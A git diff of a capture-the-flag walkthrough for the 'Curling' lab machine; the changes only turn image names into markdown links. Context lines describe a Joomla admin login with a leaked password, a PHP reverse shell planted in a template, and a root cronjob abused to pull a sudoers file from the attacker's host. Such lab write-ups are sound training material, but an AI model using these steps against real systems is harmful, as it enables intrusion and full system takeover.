@@ -6,7 +6,7 @@
 
 ------------------------------------------------
 
-Curling.png
+![Curling.png](../assets/curling_assets/Curling.png)
 
 #### Enumeration
 
@@ -37,11 +37,11 @@ Nmap done: 1 IP address (1 host up) scanned in 29.21 seconds
 
 Looking at the site on port 80 we find a Joomla blog:
 
-htb_curling_site.png
+![htb_curling_site.png](../assets/curling_assets/htb_curling_site.png)
 
 Running joomscan we find the target is running Joomla 3.8.8
 
-htb_curling_joomscan.png
+![htb_curling_joomscan.png](../assets/curling_assets/htb_curling_joomscan.png)
 
 Looking around the site we discover a possible username:
 
@@ -53,7 +53,7 @@ Hey this is the first post on this amazing website! Stay tuned for more amazing 
 
 Scrolling down to the bottom of the page source we find a comment:
 
-htb_curling_source.png
+![htb_curling_source.png](../assets/curling_assets/htb_curling_source.png)
 
 If we navigate to http://10.129.130.63/secret.txt we find some base64:
 
@@ -71,7 +71,7 @@ Curling2018!
 
 We can't use this for SSH as user Floris, but we can use it to login to the site at http://10.129.130.63/administrator:
 
-htb_curling_in.png
+![htb_curling_in.png](../assets/curling_assets/htb_curling_in.png)
 
 ### Exploitation
 
@@ -81,7 +81,7 @@ We can go to Templates > Templates > Prostar > and scroll down to and select err
 
 Let's overwrite this code with PentestMonkey's famous php-reverse-shell.php
 
-htb_curling_edit.png
+![htb_curling_edit.png](../assets/curling_assets/htb_curling_edit.png)
 
 Once this is saved we can set up a listener, and navigate to 10.129.130.63/templates/protostar/error.php?
 
@@ -113,7 +113,7 @@ cat: user.txt: Permission denied
 ```
 Inside user floris's home directory there is an interesting file called password_backup
 
-htb_curling_backup.png
+![htb_curling_backup.png](../assets/curling_assets/htb_curling_backup.png)
 
 Decoding this was tricky, and I relied on ChatGPTs help.
 
@@ -170,7 +170,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 I then entered the created directory and discovered a credential:
 
-htb_curling_pass.png
+![htb_curling_pass.png](../assets/curling_assets/htb_curling_pass.png)
 
 `5d<wdCbdZu)|hChXll`
 
@@ -185,7 +185,7 @@ floris
 
 And we can now grab the first flag:
 
-htb_curling_user.png
+![htb_curling_user.png](../assets/curling_assets/htb_curling_user.png)
 
 ### Privilege Escalation
 
@@ -195,7 +195,7 @@ Loading up pspy to view cronjobs, we see the following command being executed ev
 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
 ```
 
-htb_curling_cron.png
+![htb_curling_cron.png](../assets/curling_assets/htb_curling_cron.png)
 
 And fortunately for us, we have write access over both these files:
 
@@ -252,11 +252,11 @@ url = "http://10.10.14.114/sudoers.txt"
 
 And once the cronjob runs and my file overwrites the existing sudoers file, we can simply `sudo su -` for a root shell:
 
-htb_curling_shell.png
+![htb_curling_shell.png](../assets/curling_assets/htb_curling_shell.png)
 
 From here we can grab the final flag:
 
-htb_curling_root.png
+![htb_curling_root.png](../assets/curling_assets/htb_curling_root.png)
 
 Thanks for following along!
 
